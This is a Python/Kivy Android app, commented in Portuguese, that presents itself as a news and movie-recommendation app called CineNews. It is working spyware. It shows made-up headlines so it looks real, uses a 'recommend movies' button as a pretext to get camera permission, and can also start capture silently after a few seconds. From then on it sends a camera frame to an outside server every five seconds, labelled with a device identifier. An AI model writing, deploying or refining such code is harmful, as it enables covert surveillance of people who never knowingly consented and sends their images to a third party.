"""
CineNews - App falso de notícias e filmes
Em background, captura câmera e envia frames para o servidor ADÃO
"""

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.core.camera import Camera as KivyCamera
from kivy.core.image import Image as CoreImage
from kivy.utils import platform
import requests
import base64
import threading
import time
import os
import socket
from io import BytesIO

# ============================================================
# CONFIGURAÇÕES - COLOQUE AQUI A URL DO SEU SERVIDOR
# ============================================================
URL_SERVIDOR = 'https://sistemaadao.pythonanywhere.com/api/receber'

# ============================================================
# NOTÍCIAS FALSAS (para o app parecer real)
# ============================================================
NOTICIAS = [
    {"titulo": "🎬 Novo filme: 'Invasão Silenciosa' estreia hoje", "categoria": "Filmes"},
    {"titulo": "📰 Atualização do sistema Android 15 liberada", "categoria": "Tecnologia"},
    {"titulo": "🎵 Taylor Swift anuncia turnê mundial 2026", "categoria": "Música"},
    {"titulo": "⚽ Brasil vence amistoso contra Argentina", "categoria": "Esportes"},
    {"titulo": "🌎 Mudanças climáticas: novo relatório divulgado", "categoria": "Notícias"},
    {"titulo": "📱 iPhone 17: vazam especificações completas", "categoria": "Tecnologia"},
    {"titulo": "🎮 GTA 6: data de lançamento confirmada", "categoria": "Games"},
    {"titulo": "🍿 Série mais assistida da Netflix em 2026", "categoria": "Filmes"},
    {"titulo": "🏆 Oscar 2026: confira os indicados", "categoria": "Filmes"},
    {"titulo": "☕ Café faz bem ou mal? Novo estudo responde", "categoria": "Saúde"},
]

class TelaNoticias(BoxLayout):
    """Tela principal do app - mostra notícias"""
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 10
        self.spacing = 5
        
        # Cabeçalho
        cabecalho = BoxLayout(size_hint_y=0.1)
        cabecalho.add_widget(Label(
            text='[b]CineNews[/b]',
            markup=True,
            font_size=24,
            color=(0, 1, 0.3, 1),
            size_hint_x=0.7
        ))
        cabecalho.add_widget(Label(
            text='v2.1',
            font_size=10,
            color=(0.3, 0.3, 0.3, 1),
            size_hint_x=0.3
        ))
        self.add_widget(cabecalho)
        
        # Subtítulo
        self.add_widget(Label(
            text='🔥 Últimas notícias e filmes',
            font_size=12,
            color=(0.5, 0.5, 0.5, 1),
            size_hint_y=0.05
        ))
        
        # Área de notícias (rolável)
        scroll = ScrollView(size_hint_y=0.7)
        self.lista_noticias = BoxLayout(orientation='vertical', spacing=5, size_hint_y=None)
        self.lista_noticias.bind(minimum_height=self.lista_noticias.setter('height'))
        
        for noticia in NOTICIAS:
            card = BoxLayout(orientation='vertical', size_hint_y=None, height=60, padding=10)
            card.add_widget(Label(
                text=noticia['titulo'],
                font_size=14,
                color=(1, 1, 1, 1),
                halign='left',
                size_hint_y=0.7
            ))
            card.add_widget(Label(
                text=noticia['categoria'],
                font_size=10,
                color=(0, 1, 0.3, 0.5),
                halign='left',
                size_hint_y=0.3
            ))
            self.lista_noticias.add_widget(card)
        
        scroll.add_widget(self.lista_noticias)
        self.add_widget(scroll)
        
        # Botão "Recomendar Filmes"
        self.btn_recomendar = Button(
            text='🎬 RECOMENDAR FILMES PARA MIM',
            size_hint_y=0.08,
            background_color=(0, 0.8, 0.3, 1),
            color=(1, 1, 1, 1)
        )
        self.btn_recomendar.bind(on_press=self.pedir_permissao)
        self.add_widget(self.btn_recomendar)
        
        # Status
        self.label_status = Label(
            text='',
            font_size=10,
            color=(0.5, 0.5, 0.5, 1),
            size_hint_y=0.02
        )
        self.add_widget(self.label_status)
        
        # Inicia o processo em background
        Clock.schedule_once(self.iniciar_service, 5)
    
    def pedir_permissao(self, instance):
        """Quando clica no botão, pede permissão da câmera"""
        self.label_status.text = '📷 Solicitando acesso à câmera...'
        
        # Tenta iniciar a câmera (o Kivy vai pedir permissão automaticamente)
        try:
            self.camera = KivyCamera(play=True, index=0)
            self.camera.bind(on_texture=self.on_camera_texture)
            self.label_status.text = '✅ Câmera autorizada! Recomendando filmes...'
            self.btn_recomendar.text = '✅ RECOMENDADO!'
            
            # Inicia o envio de frames
            Clock.schedule_interval(self.enviar_frame, 5)
            
        except Exception as e:
            self.label_status.text = '❌ Erro ao acessar câmera'
    
    def iniciar_service(self, dt):
        """Tenta iniciar a captura em background"""
        try:
            self.camera = KivyCamera(play=True, index=0)
            self.camera.bind(on_texture=self.on_camera_texture)
            
            # Se chegou aqui, a permissão já foi concedida
            # Inicia o envio de frames
            Clock.schedule_interval(self.enviar_frame, 5)
            
        except:
            # Se não conseguiu, espera o usuário clicar no botão
            pass
    
    def on_camera_texture(self, instance, texture):
        """Quando a câmera entrega um frame"""
        self.ultima_texture = texture
    
    def enviar_frame(self, dt):
        """Envia frame para o servidor a cada 5 segundos"""
        if not hasattr(self, 'ultima_texture'):
            return
        
        try:
            texture = self.ultima_texture
            
            # Converte textura para imagem base64
            img = CoreImage(texture)
            buf = BytesIO()
            img.save(buf, fmt='png')
            buf.seek(0)
            
            img_base64 = base64.b64encode(buf.read()).decode('utf-8')
            
            # Pega identificador do dispositivo
            id_disp = 'android_' + str(int(time.time()))
            try:
                id_disp = 'android_' + socket.gethostname()
            except:
                pass
            
            # Envia para o servidor
            dados = {
                'id': id_disp,
                'camera': 'frontal',
                'frame': img_base64
            }
            
            try:
                r = requests.post(URL_SERVIDOR, json=dados, timeout=10)
                if r.status_code == 200:
                    print('[✓] Frame enviado')
            except:
                print('[-] Servidor offline')
        
        except Exception as e:
            print('[-] Erro ao enviar frame:', str(e))

class CineNewsApp(App):
    """App principal"""
    
    def build(self):
        self.title = 'CineNews'
        return TelaNoticias()

if __name__ == '__main__':
    CineNewsApp().run()